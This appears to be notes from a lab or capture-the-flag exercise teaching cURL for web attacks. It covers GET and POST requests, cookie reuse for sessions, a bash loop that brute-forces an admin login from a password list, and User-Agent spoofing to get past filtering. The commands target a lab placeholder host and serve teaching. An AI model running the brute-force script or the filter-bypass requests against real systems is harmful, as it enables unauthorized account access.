# Exploitation with cURL - Hoperation Eggsploit

## Scenario Context
- Blue-team intel indicates a wormhole is controlled via a web server panel.
- No GUI tools available (no browser, no Burp Suite).
- Interaction must be done via command line using HTTP requests.
- Tool of choice: **cURL**.

---

## Learning Objectives
- Understand HTTP requests and responses.
- Use cURL for GET and POST requests.
- Inspect raw HTTP responses.
- Handle cookies and sessions with cURL.
- Automate attacks (e.g., brute force).
- Bypass User-Agent restrictions.

---

## HTTP Basics
- **HTTP Request**: Client asks server for a resource.
- **HTTP Response**: Server replies with status, headers, and body.
- Browsers automate this; cURL lets us do it manually.

---

## Using cURL (GET Requests)
Basic GET request:
```
curl http://MACHINE_IP/
```
- Sends an HTTP GET request.
- Returns raw HTML/text in the terminal.

---

## Sending POST Requests
Used to submit data (e.g., login forms).

Basic POST request:
```
curl -X POST -d "username=user&password=user" http://MACHINE_IP/post.php
```

With additional form fields:
```
curl -X POST -d "username=user&password=user&submit=Login" http://MACHINE_IP/post.php
```

View headers + body:
```
curl -i -X POST -d "username=user&password=user" http://MACHINE_IP/post.php
```

Key flags:
- `-X POST` → Specify HTTP method
- `-d` → Data payload (URL-encoded)
- `-i` → Include HTTP headers

---

## Cookies and Sessions
Web apps track sessions using cookies.

### Step 1: Save cookies
```
curl -c cookies.txt -d "username=admin&password=admin" http://MACHINE_IP/session.php
```
- `-c` saves cookies to a file.

### Step 2: Reuse cookies
```
curl -b cookies.txt http://MACHINE_IP/session.php
```
- `-b` sends saved cookies.
- Enables session replay and authenticated requests.

---

## Automating Login / Brute Force
### passwords.txt
```
admin123
password
letmein
secretpass
secret
```

### loop.sh (Brute Force Script)
```
for pass in $(cat passwords.txt); do
  echo "Trying password: $pass"
  response=$(curl -s -X POST -d "username=admin&password=$pass" http://MACHINE_IP/bruteforce.php)
  if echo "$response" | grep -q "Welcome"; then
    echo "[+] Password found: $pass"
    break
  fi
done
```

Run script:
```
chmod +x loop.sh
./loop.sh
```

Key Concepts:
- Repeated POST requests with variable input.
- Detect success via response content.
- Foundation for tools like Hydra, WFuzz, Burp Intruder.

---

## Bypassing User-Agent Checks
Some servers block cURL via User-Agent filtering.

Default UA test:
```
curl -i http://MACHINE_IP/ua_check.php
```

Spoofed User-Agent:
```
curl -A "internalcomputer" http://MACHINE_IP/ua_check.php
```

Compare responses:
```
curl -i http://MACHINE_IP/ua_check.php
curl -i -A "internalcomputer" http://MACHINE_IP/ua_check.php
```

- `-A` sets a custom User-Agent.
- Used to bypass basic client restrictions.

---

## Key Takeaways
- cURL enables full HTTP interaction without a browser.
- POST requests + cookies = authenticated access.
- Automation reveals how brute-force tools work internally.
- Header manipulation (User-Agent) can bypass weak defenses.
